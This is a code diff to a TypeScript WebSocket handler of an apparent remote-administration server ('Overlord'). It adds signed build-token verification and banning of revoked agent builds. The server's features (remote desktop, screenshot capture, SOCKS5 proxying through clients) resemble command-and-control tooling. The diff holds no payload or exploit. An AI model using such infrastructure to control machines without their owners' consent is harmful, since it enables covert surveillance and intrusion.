@@ -19,6 +19,7 @@ import type { ClientInfo } from "../../types";
 import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong } from "../../wsHandlers";
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
 import { stopAllProxiesForClient } from "../socks5-proxy-manager";
+import { verifyBuildToken, isBuildBanned } from "../build-signing";
 
 const OFFLINE_GRACE_MS = (() => {
   const raw = process.env.OVERLORD_OFFLINE_GRACE_MS;
@@ -164,7 +165,12 @@ type WsLifecycleDeps = {
   clearPendingNotificationScreenshots: (clientId: string) => void;
   clearClientPluginState: (clientId: string) => void;
   notifyRemoteDesktopStatus: (clientId: string, status: string, reason?: string) => void;
-  handleBuildTagConnection: (clientId: string, buildTag: string, keyFingerprint: string) => void;
+  handleBuildTagConnection: (
+    clientId: string,
+    buildId: string | null,
+    builtByUserId: number | undefined,
+    keyFingerprint: string,
+  ) => void;
   notifyDashboard: () => void;
   notifyDashboardClientEvent: (
     event: "client_online" | "client_offline" | "client_purgatory",
@@ -360,11 +366,30 @@ export async function handleWebSocketMessage(
         const buildTag = typeof (payload as any).buildTag === "string"
           ? (payload as any).buildTag.trim()
           : "";
-        const build = buildTag ? getBuildByTag(buildTag) : null;
-        const builtByUserId = build?.builtByUserId;
 
-        if (buildTag && build?.blocked) {
-          logger.info(`[build-block] rejecting agent ${resolvedId} from blocked build ${build.id.substring(0, 8)}`);
+        let resolvedBuildId: string | null = null;
+        let builtByUserId: number | undefined;
+        let isRevoked = false;
+
+        if (buildTag) {
+          const verified = await verifyBuildToken(buildTag);
+          if (verified) {
+            resolvedBuildId = verified.bid;
+            builtByUserId = verified.uid ?? undefined;
+            isRevoked = isBuildBanned(verified.bid);
+          } else {
+            const build = getBuildByTag(buildTag);
+            if (build) {
+              resolvedBuildId = build.id;
+              builtByUserId = build.builtByUserId;
+              isRevoked = !!build.blocked || isBuildBanned(build.id);
+            }
+          }
+        }
+
+        if (buildTag && isRevoked) {
+          const shortId = resolvedBuildId ? resolvedBuildId.substring(0, 8) : "<unknown>";
+          logger.info(`[build-block] rejecting agent ${resolvedId} from revoked build ${shortId}`);
           try {
             ws.send(
               encodeMessage({
@@ -559,7 +584,7 @@ export async function handleWebSocketMessage(
           (ws as any).data.wasKnown = true;
 
           if (buildTag) {
-            deps.handleBuildTagConnection(infoObj.id, buildTag, keyFingerprint);
+            deps.handleBuildTagConnection(infoObj.id, resolvedBuildId, builtByUserId, keyFingerprint);
           }
         }
         break;
